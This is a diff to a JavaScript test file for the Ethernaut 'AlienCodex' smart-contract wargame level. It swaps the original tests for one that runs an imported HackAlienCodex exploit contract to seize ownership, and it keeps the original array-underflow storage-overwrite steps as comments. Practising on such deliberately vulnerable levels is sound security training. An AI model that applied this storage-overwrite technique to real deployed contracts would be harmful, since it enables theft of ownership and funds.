@@ -1,6 +1,8 @@
 const AlienCodex = artifacts.require('./levels/AlienCodex.sol');
 const AlienCodexFactory = artifacts.require('./levels/AlienCodexFactory.sol');
 
+const HackAlienCodexFactory = artifacts.require('./attacks/HackAlienCodex.sol')
+
 const Ethernaut = artifacts.require('./Ethernaut.sol');
 const utils = require('../utils/TestUtils');
 const { ethers, upgrades } = require('hardhat');
@@ -14,6 +16,7 @@ contract('AlienCodex', function (accounts) {
   let statproxy;
 
   before(async function () {
+    
     ethernaut = await utils.getEthernautWithStatsProxy();
     level = await AlienCodexFactory.new();
     await ethernaut.registerLevel(level.address);
@@ -36,27 +39,43 @@ contract('AlienCodex', function (accounts) {
       assert.isFalse(status);
     });
 
-    it('should allow the user to join AlienCodex', async function () {
-      await instance.makeContact();
 
-      // Player should have successfully made first contact
-      let status = await instance.contact.call();
-      assert.isTrue(status);
-    });
+    it('Tony hack procedure', async function () {
 
-    it('codex array should underflow, giving user all storage access to become owner', async function () {
-      await instance.retract();
+      const hackAlienCodexContract = await HackAlienCodexFactory.new();
 
-      const owner_loc =
-        '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'; // location of owner ptr, offset by array's frame of reference
-      const padding = '0x000000000000000000000000';
-      let _data = padding + player.substr(2);
-
-      await instance.revise(owner_loc, _data, { from: player });
+      await hackAlienCodexContract.exploit(instance.address,player);
 
       // Player should own the instance now
       let ownr = await instance.owner();
       assert.equal(ownr, player);
+
     });
+
+
+
+    // it('should allow the user to join AlienCodex', async function () {
+    //   await instance.makeContact();
+
+    //   // Player should have successfully made first contact
+    //   let status = await instance.contact.call();
+    //   assert.isTrue(status);
+    // });
+
+
+    // it('codex array should underflow, giving user all storage access to become owner', async function () {
+    //   // await instance.retract();
+
+    //   // const owner_loc =
+    //   //   '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'; // location of owner ptr, offset by array's frame of reference
+    //   // const padding = '0x000000000000000000000000';
+    //   // let _data = padding + player.substr(2);
+
+    //   // await instance.revise(owner_loc, _data, { from: player });
+
+    //   // Player should own the instance now
+    //   let ownr = await instance.owner();
+    //   assert.equal(ownr, player);
+    // });
   });
 });
